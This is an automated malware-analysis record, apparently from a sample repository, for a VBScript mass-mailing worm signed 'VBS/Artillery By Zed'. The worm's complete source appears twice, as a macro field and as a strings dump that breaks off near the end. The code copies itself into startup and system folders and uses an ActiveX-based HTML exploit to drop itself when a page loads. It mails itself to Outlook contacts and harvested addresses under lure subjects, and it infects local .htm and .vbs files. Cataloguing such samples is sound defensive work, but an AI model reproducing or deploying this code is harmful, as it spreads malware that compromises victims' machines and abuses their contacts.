{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "RegRead": "May read registry keys",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Write": "May write to a file"
        },
        "macro": "'VBS/Artillery By Zed\nOn Error Resume Next\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet wsc = CreateObject(\"WScript.Shell\")\nOlkCode = Chr(34) & Chr(79) & Chr(117) & Chr(116) & Chr(108) & Chr(111) & Chr(111) & Chr(107) & Chr(46) & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(34)\nExecute \"Set OlkApp = CreateObject(\" & OlkCode & \")\"\nStartDir = BreakFolder(wsc.SpecialFolders(\"Startup\"))\nWinDir = BreakFolder(fso.GetSpecialFolder(0))\nSysDir = BreakFolder(fso.GetSpecialFolder(1))\nFCopy StartDir & \"\\Winwsh32.vbs\", 2\nFCopy WinDir & \"\\Login32.vbs\", 0\nFCopy SysDir & \"\\Winmsgc32.vbs\", 0\nFCopy WinDir & \"\\Winmsgc.vbe\", 2\nFCopy SysDir & \"\\Winmsgc.vbe\", 2\nRegSoftwareKey = Chr(72) & Chr(75) & Chr(67) & Chr(85) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(90) & Chr(101) & Chr(100) & Chr(92) & Chr(65) & Chr(114) & Chr(116) & Chr(105) & Chr(108) & Chr(108) & Chr(101) & Chr(114) & Chr(121)\nIf OlkApp <> \"\" Then\nOlkInstalled = True\nCreateExpCode WinDir & \"\\Winhtm32.html\"\nElse\nOlkInstalled = False\nEnd If\nSet otf = fso.OpenTextFile(WScript.ScriptFullName, 1)\nra = otf.ReadAll\notf.Close\nFor CLoop = 1 To Len(ra)\nChar = Mid(ra, CLoop, 1)\nIf Char = Chr(34) Then\nChar = Char & Chr(34)\nEnd If\nIf Char = Chr(13) Then\nChar = Chr(34) & \" & vbCrLf & \" & Chr(34)\nEnd If\nIf Char = Chr(10) Then\nChar = \"\"\nEnd If\nIf Char = Chr(47) Then\nChar = Chr(34) & \" & Chr(47) & \" & Chr(34)\nEnd If\nTXTMod = TXTMod & Char\nNext\nExecCode = Chr(99) & Chr(111) & Chr(109) & Chr(46) & Chr(109) & Chr(115) & Chr(46) & Chr(97) & Chr(99) & Chr(116) & Chr(105) & Chr(118) & Chr(101) & Chr(88) & Chr(46) & Chr(65) & Chr(99) & Chr(116) & Chr(105) & Chr(118) & Chr(101) & Chr(88) & Chr(67) & Chr(111) & Chr(109) & Chr(112) & Chr(111) & Chr(110) & Chr(101) & Chr(110) & Chr(116)\nExploitCode = \"<APPLET HEIGHT=0 WIDTH=0 code=\" & ExecCode & \"></APPLET>\" & vbCrLf & \"<Script Language = JAVASCRIPT>\" & vbCrLf & \"// VBS/Artillery by Zed\" & vbCrLf & \"function WriteExploit(){\" & vbCrLf & \"CreateObj = document.applets[0];\" & vbCrLf & \"CreateObj.setCLSID(\"\"{0D43FE01-F093-11CF-8940-00A0C9054228}\"\");\" & vbCrLf & \"CreateObj.createInstance();\" & vbCrLf & \"fso = CreateObj.GetObject();\" & vbCrLf & \"CreateObj.setCLSID(\"\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\"\");\" & vbCrLf & \"CreateObj.createInstance();\" & vbCrLf & \"wsc = CreateObj.GetObject();\" & vbCrLf & \"var WriteCode = fso.CreateTextFile(wsc.SpecialFolders(\"\"Startup\"\") + \"\"\\\\Winwsh32.vbs\"\", 1);\" & vbCrLf & \"WriteCode.Write (WormCode);\" & vbCrLf & \"WriteCode.Close();\" & vbCrLf & \"}\" & vbCrLf & \"setTimeout(\"\"WriteExploit()\"\", 1000);\" & vbCrLf & \"</Script>\" & vbCrLf & \"<Script Language = VBSCRIPT>\" & vbCrLf & \"On Error Resume Next\" & vbCrLf & \"WormCode = \" & Chr(34) & TXTMod & Chr(34) & vbCrLf & \"// VBS/Artillery by Zed\" & vbCrLf & \"</Script>\"\nIf OlkInstalled = True Then\nMap = Chr(34) & Chr(77) & Chr(65) & Chr(80) & Chr(73) & Chr(34)\nExecute \"Set GNS = OlkApp.GetNameSpace(\" & Map & \")\"\nFor EN1 = 1 To GNS.GetDefaultFolder(4).Items.Count\nEmlSwitch = 1\nSet OE2 = OlkApp.CreateItem(0)\nSet EmailMsg = GNS.GetDefaultFolder(4).Items.Item(EmlSwitch)\nIf EmailMsg.To <> \"\" Then OE2.To = EmailMsg.To\nIf EmailMsg.CC <> \"\" Then OE2.CC = EmailMsg.CC\nIf EmailMsg.BCC <> \"\" Then OE2.BCC = EmailMsg.BCC\nOE2.Subject = EmailMsg.Subject\nOE2.HTMLBody = ExploitCode\nOE2.Importance = EmailMsg.Importance\nOE2.Attachments.Add WinDir & \"\\Winhtm32.html\"\nOE2.DeleteAfterSubmit = True\nOE2.Send\nGNS.GetDefaultFolder(4).Items.Remove EmlSwitch\nEmlSwitch = EmlSwitch + 1\nNext\nAddyLst = Chr(65) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(76) & Chr(105) & Chr(115) & Chr(116) & Chr(115)\nAddyEnt = Chr(65) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(69) & Chr(110) & Chr(116) & Chr(114) & Chr(105) & Chr(101) & Chr(115)\nExecute \"Set Adlst = GNS.\" & AddyLst\nFor Each ContactSwitch In Adlst\nExecute \"Set adyent = ContactSwitch.\" & AddyEnt\nFor UserGroup = 1 To adyent.Count\nSendEmail adyent(UserGroup)\nNext\nNext\nEnd If\nFor Each MappedDrive In fso.Drives\nIf MappedDrive.DriveType = 2 Or MappedDrive.DriveType = 3 Then\nIf MappedDrive.IsReady Then\nPCFolderSeek BreakFolder(MappedDrive.Path) & \"\\\"\nEnd If\nEnd If\nNext\nFunction PCFolderSeek(FPath)\nOn Error Resume Next\nFor Each PCFolder In fso.GetFolder(FPath).SubFolders\nPCFileSeek PCFolder.Path\nPCFolderSeek PCFolder.Path\nNext\nEnd Function\nFunction PCFileSeek(FPath)\nOn Error Resume Next\nFor Each PCFile In fso.GetFolder(FPath).Files\nFileExt = LCase(fso.GetExtensionName(PCFile.Path))\nIf FileExt = \"htm\" Or FileExt = \"html\" Then\nIf OlkInstalled = True Then\nFindEmail PCFile.Path\nEnd If\nHTMWrite PCFile.Path\nEnd If\nIf FileExt = \"ctt\" Then\nIf OlkInstalled = True Then\nFindCTTEmail PCFile.Path\nEnd If\nEnd If\nIf FileExt = \"vbs\" Or FileExt = \"vbs\" Then\nVBSAppend PCFile.Path\nEnd If\nNext\nEnd Function\nFunction FindEmail(HTPath)\nOn Error Resume Next\nSet OpenHTFile = fso.OpenTextFile(HTPath, 1)\nHTCode = OpenHTFile.ReadAll\nOpenHTFile.Close\nMailtoStr = InStr(1, LCase(HTCode), \"mailto:\")\nIf MailtoStr <> 0 Then\nHTSplitLine = Split(HTCode, vbCrLf)\nFor Each HTLineSrc In HTSplitLine\nMailToLine = InStr(1, LCase(HTLineSrc), \"mailto:\")\nIf MailToLine <> 0 Then\nDelBeforeMailto = Right(HTLineSrc, Len(HTLineSrc) - MailToLine - 6)\nFor CLoop = 1 To Len(DelBeforeMailto)\nEmlChr = Mid(DelBeforeMailto, CLoop, 1)\nIf EmlChr = Chr(34) Or EmlChr = \"'\" Or EmlChr = \"<\" Or EmlChr = \"?\" Or EmlChr = \">\" Or EmlChr = Chr(32) Or EmlChr = \"[\" Or EmlChr = \"]\" Then\nExit For\nEnd If\nEmailStr = EmailStr & EmlChr\nNext\nIf EmailStr <> \"\" Then\nIf Len(EmailStr) < 50 Then\nIf InStr(1, EmailStr, \"@\") <> 0 Then\nIf InStr(1, EmailStr, \".\") <> 0 Then\nSendEmail EmailStr\nEmailStr = \"\"\nEnd If\nEnd If\nEnd If\nEnd If\nEnd If\nNext\nEnd If\nEnd Function\nFunction FindCTTEmail(CTTFile)\nOn Error Resume Next\nSet OpenCTT = fso.OpenTextFile(CTTFile, 1)\nCTTSource = OpenCTT.ReadAll\nOpenCTT.Close\nSplitSrc = Split(CTTSource, vbCrLf)\nFor Each SrcLine In SplitSrc\nStartStr = InStr(1, LCase(SrcLine), \"<contact>\")\nEndStr = InStr(1, LCase(SrcLine), \"</contact>\")\nIf StartStr <> 0 And EndStr <> 0 Then\nCharCount = 0\nFor CLoop = 1 To Len(SrcLine)\nCharCount = CharCount + 1\nIf Mid(SrcLine, CLoop, 1) = \">\" Then Exit For\nNext\nRtBreak = Right(SrcLine, Len(SrcLine) - CharCount)\nFor KL1 = 1 To Len(RtBreak)\nLtBreak = Left(RtBreak, KL1)\nIf Right(LtBreak, 1) = \"<\" Then Exit For\nNext\nCTTEmailStr = Left(LtBreak, Len(LtBreak) - 1)\nIf InStr(1, CTTEmailStr, \"@\") <> 0 Then\nIf InStr(1, CTTEmailStr, \".\") <> 0 Then\nSendEmail CTTEmailStr\nEnd If\nEnd If\nEnd If\nNext\nEnd Function\nFunction SendEmail(EmailAddress)\nOn Error Resume Next\nIf OlkInstalled = True Then\nRegEmailKey = RegSoftwareKey & \"\\EmailIndex\\\" & EmailAddress\nCheckIfSent = wsc.RegRead(RegEmailKey)\nIf CheckIfSent = \"\" Then\nRandomize\nSelect Case Int((19 * Rnd) + 1)\nCase 1: RndSubj = \"Nothing special\"\nCase 2: RndSubj = \"Uninstall information\"\nCase 3: RndSubj = \"Password confirmation\"\nCase 4: RndSubj = \"Notice\"\nCase 5: RndSubj = \"Re:\"\nCase 6: RndSubj = \"Some news\"\nCase 7: RndSubj = \"Hello\"\nCase 8: RndSubj = \"MP3s\"\nCase 9: RndSubj = \"Just a reply\"\nCase 10: RndSubj = \"Email changes\"\nCase 11: RndSubj = \"Reminder\"\nCase 12: RndSubj = \"File backup\"\nCase 13: RndSubj = \"Webpage builder\"\nCase 14: RndSubj = \"Some documents\"\nCase 15: RndSubj = \"Jokes\"\nCase 16\nRW16 = Array(\"sign up\", \"login\", \"email\", \"download\", \"password\", \"domain\", \"document\", \"spreadsheet\", \"file\", \"webpage\")\nRandomize\nRndSubj = \"New \" & RW16(Int(9 * Rnd))\nCase 17: RndSubj = \"Some notes\"\nCase 18\nRW18 = Array(\"Email\", \"Business\", \"Web\", \"Confidential\", \"Printer\", \"Webpage\")\nRW28 = Array(\"passwords\", \"files\", \"documents\", \"spreadsheets\", \"folders\", \"notes\", \"tools\", \"guides\", \"scripts\", \"summary\", \"overview\")\nRandomize\nRandomize\nRndSubj = RW18(Int(5 * Rnd)) & Chr(32) & RW28(Int(10 * Rnd))\nCase 19: RndSubj = \"Backup data\"\nEnd Select\nSet OlkEml = OlkApp.CreateItem(0)\nOlkEml.To = EmailAddress\nOlkEml.Subject = RndSubj\nOlkEml.HTMLBody = ExploitCode\nOlkEml.Attachments.Add WinDir & \"\\Winhtm32.html\"\nOlkEml.DeleteAfterSubmit = True\nOlkEml.Send\nwsc.RegWrite RegEmailKey, \"Email sent - \" & TimeValue(Now)\nEnd If\nEnd If\nEnd Function\nFunction VBSAppend(VBSFile)\nOn Error Resume Next\nSet OpenVBSFile = fso.OpenTextFile(VBSFile, 1)\nVBSFileSrc = OpenVBSFile.ReadAll\nOpenVBSFile.Close\nWormTag = \"'VBS/Artillery By Zed\"\nIf InStr(1, VBSFileSrc, WormTag) = 0 Then\nSet WriteVBSFile = fso.OpenTextFile(VBSFile, 8)\nWriteVBSFile.WriteBlankLines(9)\nWriteVBSFile.Write WormTag & vbCrLf & \"Set FSOobj123 = CreateObject(\"\"Scripting.FileSystemObject\"\")\" & vbCrLf & \"Set WSCobj123 = CreateObject(\"\"WScript.Shell\"\")\" & vbCrLf & \"WCodeFile123 = WSCobj123.SpecialFolders(\"\"Startup\"\") & \"\"\\Winwsh32.vbs\"\"\" & vbCrLf & \"Set WriteWCode123 = FSOobj123.CreateTextFile(WCodeFile123, True)\" & vbCrLf & \"WriteWCode123.Write \" & Chr(34) & TXTMod & Chr(34) & vbCrLf & \"WriteWCode123.Close\" & vbCrLf & \"If FSOobj123.FileExists(WCodeFile123) Then\" & vbCrLf & \"FSOobj123.GetFile(WCodeFile123).Attributes = 2\" & vbCrLf & \"End If\" & vbCrLf & WormTag\nWriteVBSFile.Close\nEnd If\nEnd Function\nFunction HTMWrite(HTMPath)\nOn Error Resume Next\nSet OpenHTMFile = fso.OpenTextFile(HTMPath, 1)\nHTMFileSrc = OpenHTMFile.ReadAll\nOpenHTMFile.Close\nIf InStr(1, HTMFileSrc, \"// VBS/Artillery by Zed\") = 0 Then\nFoundCode = InStr(1, LCase(HTMFileSrc), \"<body\")\nIf FoundCode <> 0 Then\nBreakHTMLines = Split(HTMFileSrc, vbCrLf)\nFor Each HTMSrcLine In BreakHTMLines\nIf InStr(1, LCase(HTMSrcLine), \"<body\") <> 0 And InStr(1, HTMSrcLine, vbCrLf) = 0 Then\nIf InStr(1, HTMSrcLine, \"<\") <> 0 And InStr(1, HTMSrcLine, \">\") <> 0 Then\nNewHTMCode = Replace(HTMFileSrc, HTMSrcLine, HTMSrcLine & vbCrLf & ExploitCode & vbCrLf)\nSet WriteHTMFile = fso.OpenTextFile(HTMPath, 2)\nWriteHTMFile.Write NewHTMCode\nWriteHTMFile.Close\nExit For\nEnd If\nEnd If\nNext\nEnd If\nEnd If\nEnd Function\nFunction BreakFolder(TextStr)\nOn Error Resume Next\nIf Right(TextStr, 1) = \"\\\" Then\nBreakFolder = Left(TextStr, Len(TextStr) - 1)\nElse\nBreakFolder = TextStr\nEnd If\nEnd Function\nFunction CreateExpCode(ExpPath)\nOn Error Resume Next\nSet Write1Exp = fso.CreateTextFile(ExpPath, True)\nWrite1Exp.Write ExploitCode\nWrite1Exp.Close\nEnd Function\nFunction FCopy(FPath, FAttributes)\nOn Error Resume Next\nfso.CopyFile WScript.ScriptFullName, FPath\nIf fso.FileExists(FPath) Then\nfso.GetFile(FPath).Attributes = FAttributes\nEnd If\nEnd Function\n'VBS/Artillery By Zed"
    },
    "filename": "VirusShare_419a92b58266b079e6f36bc2a541e484",
    "filesize": 10930,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "419a92b58266b079e6f36bc2a541e484",
        "sha1": "ccbc9f4cf48369b9408fbb6c83764784804b7df9",
        "sha256": "5c2b4e8bffa81bef72085e727e9293d2ee48dada299f8c5bc700993ab11cd710"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "'VBS/Artillery By Zed",
            "On Error Resume Next",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set wsc = CreateObject(\"WScript.Shell\")",
            "OlkCode = Chr(34) & Chr(79) & Chr(117) & Chr(116) & Chr(108) _",
            "& Chr(111) & Chr(111) & Chr(107) & Chr(46) & Chr(65) _",
            "& Chr(112) & Chr(112) & Chr(108) & Chr(105) _",
            "& Chr(99) & Chr(97) & Chr(116) _",
            "& Chr(105) & Chr(111) _",
            "& Chr(110) & Chr(34)",
            "Execute \"Set OlkApp = CreateObject(\" & OlkCode & \")\"",
            "StartDir = BreakFolder(wsc.SpecialFolders(\"Startup\"))",
            "WinDir = BreakFolder(fso.GetSpecialFolder(0))",
            "SysDir = BreakFolder(fso.GetSpecialFolder(1))",
            "FCopy StartDir & \"\\Winwsh32.vbs\", 2",
            "FCopy WinDir & \"\\Login32.vbs\", 0",
            "FCopy SysDir & \"\\Winmsgc32.vbs\", 0",
            "FCopy WinDir & \"\\Winmsgc.vbe\", 2",
            "FCopy SysDir & \"\\Winmsgc.vbe\", 2",
            "RegSoftwareKey = Chr(72) & Chr(75) & Chr(67) & Chr(85) _",
            "& Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) _",
            "& Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) _",
            "& Chr(90) & Chr(101) & Chr(100) & Chr(92) & Chr(65) _",
            "& Chr(114) & Chr(116) & Chr(105) & Chr(108) _",
            "& Chr(108) & Chr(101) & Chr(114) & Chr(121)",
            "If OlkApp <> \"\" Then",
            "OlkInstalled = True",
            "CreateExpCode WinDir & \"\\Winhtm32.html\"",
            "Else",
            "OlkInstalled = False",
            "End If",
            "Set otf = fso.OpenTextFile(WScript.ScriptFullName, 1)",
            "ra = otf.ReadAll",
            "otf.Close",
            "For CLoop = 1 To Len(ra)",
            "Char = Mid(ra, CLoop, 1)",
            "If Char = Chr(34) Then",
            "Char = Char & Chr(34)",
            "End If",
            "If Char = Chr(13) Then",
            "Char = Chr(34) & \" & vbCrLf & \" & Chr(34)",
            "End If",
            "If Char = Chr(10) Then",
            "Char = \"\"",
            "End If",
            "If Char = Chr(47) Then",
            "Char = Chr(34) & \" & Chr(47) & \" & Chr(34)",
            "End If",
            "TXTMod = TXTMod & Char",
            "Next",
            "ExecCode = Chr(99) & Chr(111) & Chr(109) _",
            "& Chr(46) & Chr(109) & Chr(115) _",
            "& Chr(46) & Chr(97) & Chr(99) _",
            "& Chr(116) & Chr(105) & Chr(118) _",
            "& Chr(101) & Chr(88) & Chr(46) _",
            "& Chr(65) & Chr(99) & Chr(116) _",
            "& Chr(105) & Chr(118) & Chr(101) _",
            "& Chr(88) & Chr(67) & Chr(111) _",
            "& Chr(109) & Chr(112) & Chr(111) _",
            "& Chr(110) & Chr(101) & Chr(110) & Chr(116)",
            "ExploitCode = \"<APPLET HEIGHT=0 WIDTH=0 code=\" & ExecCode & \"></APPLET>\" & vbCrLf _",
            "& \"<Script Language = JAVASCRIPT>\" & vbCrLf _",
            "& \"// VBS/Artillery by Zed\" & vbCrLf _",
            "& \"function WriteExploit(){\" & vbCrLf _",
            "& \"CreateObj = document.applets[0];\" & vbCrLf _",
            "& \"CreateObj.setCLSID(\"\"{0D43FE01-F093-11CF-8940-00A0C9054228}\"\");\" & vbCrLf _",
            "& \"CreateObj.createInstance();\" & vbCrLf _",
            "& \"fso = CreateObj.GetObject();\" & vbCrLf _",
            "& \"CreateObj.setCLSID(\"\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\"\");\" & vbCrLf _",
            "& \"CreateObj.createInstance();\" & vbCrLf _",
            "& \"wsc = CreateObj.GetObject();\" & vbCrLf _",
            "& \"var WriteCode = fso.CreateTextFile(wsc.SpecialFolders(\"\"Startup\"\") + \"\"\\\\Winwsh32.vbs\"\", 1);\" & vbCrLf _",
            "& \"WriteCode.Write (WormCode);\" & vbCrLf _",
            "& \"WriteCode.Close();\" & vbCrLf _",
            "& \"}\" & vbCrLf _",
            "& \"setTimeout(\"\"WriteExploit()\"\", 1000);\" & vbCrLf _",
            "& \"</Script>\" & vbCrLf _",
            "& \"<Script Language = VBSCRIPT>\" & vbCrLf _",
            "& \"On Error Resume Next\" & vbCrLf _",
            "& \"WormCode = \" & Chr(34) & TXTMod & Chr(34) & vbCrLf _",
            "& \"// VBS/Artillery by Zed\" & vbCrLf _",
            "& \"</Script>\"",
            "If OlkInstalled = True Then",
            "Map = Chr(34) & Chr(77) & Chr(65) & Chr(80) & Chr(73) & Chr(34)",
            "Execute \"Set GNS = OlkApp.GetNameSpace(\" & Map & \")\"",
            "For EN1 = 1 To GNS.GetDefaultFolder(4).Items.Count",
            "EmlSwitch = 1",
            "Set OE2 = OlkApp.CreateItem(0)",
            "Set EmailMsg = GNS.GetDefaultFolder(4).Items.Item(EmlSwitch)",
            "If EmailMsg.To <> \"\" Then OE2.To = EmailMsg.To",
            "If EmailMsg.CC <> \"\" Then OE2.CC = EmailMsg.CC",
            "If EmailMsg.BCC <> \"\" Then OE2.BCC = EmailMsg.BCC",
            "OE2.Subject = EmailMsg.Subject",
            "OE2.HTMLBody = ExploitCode",
            "OE2.Importance = EmailMsg.Importance",
            "OE2.Attachments.Add WinDir & \"\\Winhtm32.html\"",
            "OE2.DeleteAfterSubmit = True",
            "OE2.Send",
            "GNS.GetDefaultFolder(4).Items.Remove EmlSwitch",
            "EmlSwitch = EmlSwitch + 1",
            "Next",
            "AddyLst = Chr(65) & Chr(100) & Chr(100) & Chr(114) _",
            "& Chr(101) & Chr(115) & Chr(115) _",
            "& Chr(76) & Chr(105) & Chr(115) _",
            "& Chr(116) & Chr(115)",
            "AddyEnt = Chr(65) & Chr(100) & Chr(100) _",
            "& Chr(114) & Chr(101) & Chr(115) & Chr(115) _",
            "& Chr(69) & Chr(110) & Chr(116) _",
            "& Chr(114) & Chr(105) _",
            "& Chr(101) & Chr(115)",
            "Execute \"Set Adlst = GNS.\" & AddyLst",
            "For Each ContactSwitch In Adlst",
            "Execute \"Set adyent = ContactSwitch.\" & AddyEnt",
            "For UserGroup = 1 To adyent.Count",
            "SendEmail adyent(UserGroup)",
            "Next",
            "Next",
            "End If",
            "For Each MappedDrive In fso.Drives",
            "If MappedDrive.DriveType = 2 Or MappedDrive.DriveType = 3 Then",
            "If MappedDrive.IsReady Then",
            "PCFolderSeek BreakFolder(MappedDrive.Path) & \"\\\"",
            "End If",
            "End If",
            "Next",
            "Function PCFolderSeek(FPath)",
            "On Error Resume Next",
            "For Each PCFolder In fso.GetFolder(FPath).SubFolders",
            "PCFileSeek PCFolder.Path",
            "PCFolderSeek PCFolder.Path",
            "Next",
            "End Function",
            "Function PCFileSeek(FPath)",
            "On Error Resume Next",
            "For Each PCFile In fso.GetFolder(FPath).Files",
            "FileExt = LCase(fso.GetExtensionName(PCFile.Path))",
            "If FileExt = \"htm\" Or FileExt = \"html\" Then",
            "If OlkInstalled = True Then",
            "FindEmail PCFile.Path",
            "End If",
            "HTMWrite PCFile.Path",
            "End If",
            "If FileExt = \"ctt\" Then",
            "If OlkInstalled = True Then",
            "FindCTTEmail PCFile.Path",
            "End If",
            "End If",
            "If FileExt = \"vbs\" Or FileExt = \"vbs\" Then",
            "VBSAppend PCFile.Path",
            "End If",
            "Next",
            "End Function",
            "Function FindEmail(HTPath)",
            "On Error Resume Next",
            "Set OpenHTFile = fso.OpenTextFile(HTPath, 1)",
            "HTCode = OpenHTFile.ReadAll",
            "OpenHTFile.Close",
            "MailtoStr = InStr(1, LCase(HTCode), \"mailto:\")",
            "If MailtoStr <> 0 Then",
            "HTSplitLine = Split(HTCode, vbCrLf)",
            "For Each HTLineSrc In HTSplitLine",
            "MailToLine = InStr(1, LCase(HTLineSrc), \"mailto:\")",
            "If MailToLine <> 0 Then",
            "DelBeforeMailto = Right(HTLineSrc, Len(HTLineSrc) - MailToLine - 6)",
            "For CLoop = 1 To Len(DelBeforeMailto)",
            "EmlChr = Mid(DelBeforeMailto, CLoop, 1)",
            "If EmlChr = Chr(34) Or EmlChr = \"'\" _",
            "Or EmlChr = \"<\" _",
            "Or EmlChr = \"?\" Or EmlChr = \">\" _",
            "Or EmlChr = Chr(32) _",
            "Or EmlChr = \"[\" _",
            "Or EmlChr = \"]\" Then",
            "Exit For",
            "End If",
            "EmailStr = EmailStr & EmlChr",
            "Next",
            "If EmailStr <> \"\" Then",
            "If Len(EmailStr) < 50 Then",
            "If InStr(1, EmailStr, \"@\") <> 0 Then",
            "If InStr(1, EmailStr, \".\") <> 0 Then",
            "SendEmail EmailStr",
            "EmailStr = \"\"",
            "End If",
            "End If",
            "End If",
            "End If",
            "End If",
            "Next",
            "End If",
            "End Function",
            "Function FindCTTEmail(CTTFile)",
            "On Error Resume Next",
            "Set OpenCTT = fso.OpenTextFile(CTTFile, 1)",
            "CTTSource = OpenCTT.ReadAll",
            "OpenCTT.Close",
            "SplitSrc = Split(CTTSource, vbCrLf)",
            "For Each SrcLine In SplitSrc",
            "StartStr = InStr(1, LCase(SrcLine), \"<contact>\")",
            "EndStr = InStr(1, LCase(SrcLine), \"</contact>\")",
            "If StartStr <> 0 And EndStr <> 0 Then",
            "CharCount = 0",
            "For CLoop = 1 To Len(SrcLine)",
            "CharCount = CharCount + 1",
            "If Mid(SrcLine, CLoop, 1) = \">\" Then Exit For",
            "Next",
            "RtBreak = Right(SrcLine, Len(SrcLine) - CharCount)",
            "For KL1 = 1 To Len(RtBreak)",
            "LtBreak = Left(RtBreak, KL1)",
            "If Right(LtBreak, 1) = \"<\" Then Exit For",
            "Next",
            "CTTEmailStr = Left(LtBreak, Len(LtBreak) - 1)",
            "If InStr(1, CTTEmailStr, \"@\") <> 0 Then",
            "If InStr(1, CTTEmailStr, \".\") <> 0 Then",
            "SendEmail CTTEmailStr",
            "End If",
            "End If",
            "End If",
            "Next",
            "End Function",
            "Function SendEmail(EmailAddress)",
            "On Error Resume Next",
            "If OlkInstalled = True Then",
            "RegEmailKey = RegSoftwareKey & \"\\EmailIndex\\\" & EmailAddress",
            "CheckIfSent = wsc.RegRead(RegEmailKey)",
            "If CheckIfSent = \"\" Then",
            "Randomize",
            "Select Case Int((19 * Rnd) + 1)",
            "Case 1: RndSubj = \"Nothing special\"",
            "Case 2: RndSubj = \"Uninstall information\"",
            "Case 3: RndSubj = \"Password confirmation\"",
            "Case 4: RndSubj = \"Notice\"",
            "Case 5: RndSubj = \"Re:\"",
            "Case 6: RndSubj = \"Some news\"",
            "Case 7: RndSubj = \"Hello\"",
            "Case 8: RndSubj = \"MP3s\"",
            "Case 9: RndSubj = \"Just a reply\"",
            "Case 10: RndSubj = \"Email changes\"",
            "Case 11: RndSubj = \"Reminder\"",
            "Case 12: RndSubj = \"File backup\"",
            "Case 13: RndSubj = \"Webpage builder\"",
            "Case 14: RndSubj = \"Some documents\"",
            "Case 15: RndSubj = \"Jokes\"",
            "Case 16",
            "RW16 = Array(\"sign up\", \"login\", _",
            "\"email\", \"download\", \"password\", _",
            "\"domain\", \"document\", \"spreadsheet\", _",
            "\"file\", \"webpage\")",
            "Randomize",
            "RndSubj = \"New \" & RW16(Int(9 * Rnd))",
            "Case 17: RndSubj = \"Some notes\"",
            "Case 18",
            "RW18 = Array(\"Email\", \"Business\", \"Web\", _",
            "\"Confidential\", \"Printer\", \"Webpage\")",
            "RW28 = Array(\"passwords\", \"files\", \"documents\", _",
            "\"spreadsheets\", \"folders\", \"notes\", \"tools\", _",
            "\"guides\", \"scripts\", \"summary\", \"overview\")",
            "Randomize",
            "Randomize",
            "RndSubj = RW18(Int(5 * Rnd)) _",
            "& Chr(32) & RW28(Int(10 * Rnd))",
            "Case 19: RndSubj = \"Backup data\"",
            "End Select",
            "Set OlkEml = OlkApp.CreateItem(0)",
            "OlkEml.To = EmailAddress",
            "OlkEml.Subject = RndSubj",
            "OlkEml.HTMLBody = ExploitCode",
            "OlkEml.Attachments.Add WinDir & \"\\Winhtm32.html\"",
            "OlkEml.DeleteAfterSubmit = True",
            "OlkEml.Send",
            "wsc.RegWrite RegEmailKey, \"Email sent - \" & TimeValue(Now)",
            "End If",
            "End If",
            "End Function",
            "Function VBSAppend(VBSFile)",
            "On Error Resume Next",
            "Set OpenVBSFile = fso.OpenTextFile(VBSFile, 1)",
            "VBSFileSrc = OpenVBSFile.ReadAll",
            "OpenVBSFile.Close",
            "WormTag = \"'VBS/Artillery By Zed\"",
            "If InStr(1, VBSFileSrc, WormTag) = 0 Then",
            "Set WriteVBSFile = fso.OpenTextFile(VBSFile, 8)",
            "WriteVBSFile.WriteBlankLines(9)",
            "WriteVBSFile.Write WormTag & vbCrLf _",
            "& \"Set FSOobj123 = CreateObject(\"\"Scripting.FileSystemObject\"\")\" & vbCrLf _",
            "& \"Set WSCobj123 = CreateObject(\"\"WScript.Shell\"\")\" & vbCrLf _",
            "& \"WCodeFile123 = WSCobj123.SpecialFolders(\"\"Startup\"\") & \"\"\\Winwsh32.vbs\"\"\" & vbCrLf _",
            "& \"Set WriteWCode123 = FSOobj123.CreateTextFile(WCodeFile123, True)\" & vbCrLf _",
            "& \"WriteWCode123.Write \" & Chr(34) & TXTMod & Chr(34) & vbCrLf _",
            "& \"WriteWCode123.Close\" & vbCrLf _",
            "& \"If FSOobj123.FileExists(WCodeFile123) Then\" & vbCrLf _",
            "& \"FSOobj123.GetFile(WCodeFile123).Attributes = 2\" & vbCrLf _",
            "& \"End If\" & vbCrLf _",
            "& WormTag",
            "WriteVBSFile.Close",
            "End If",
            "End Function",
            "Function HTMWrite(HTMPath)",
            "On Error Resume Next",
            "Set OpenHTMFile = fso.OpenTextFile(HTMPath, 1)",
            "HTMFileSrc = OpenHTMFile.ReadAll",
            "OpenHTMFile.Close",
            "If InStr(1, HTMFileSrc, \"// VBS/Artillery by Zed\") = 0 Then",
            "FoundCode = InStr(1, LCase(HTMFileSrc), \"<body\")",
            "If FoundCode <> 0 Then",
            "BreakHTMLines = Split(HTMFileSrc, vbCrLf)",
            "For Each HTMSrcLine In BreakHTMLines",
            "If InStr(1, LCase(HTMSrcLine), \"<body\") <> 0 _",
            "And InStr(1, HTMSrcLine, vbCrLf) = 0 Then",
            "If InStr(1, HTMSrcLine, \"<\") <> 0 _",
            "And InStr(1, HTMSrcLine, \">\") <> 0 Then",
            "NewHTMCode = Replace(HTMFileSrc, _",
            "HTMSrcLine, HTMSrcLine _",
            "& vbCrLf & ExploitCode & vbCrLf)",
            "Set WriteHTMFile = fso.OpenTextFile(HTMPath, 2)",
            "WriteHTMFile.Write NewHTMCode",
            "WriteHTMFile.Close",
            "Exit For",
            "End If",
            "End If",
            "Next",
            "End If",
            "End If",
            "End Function",
            "Function BreakFolder(TextStr)",
            "On Error Resume Next",
            "If Right(TextStr, 1) = \"\\\" Then",
            "BreakFolder = Left(TextStr, Len(TextStr) - 1)",
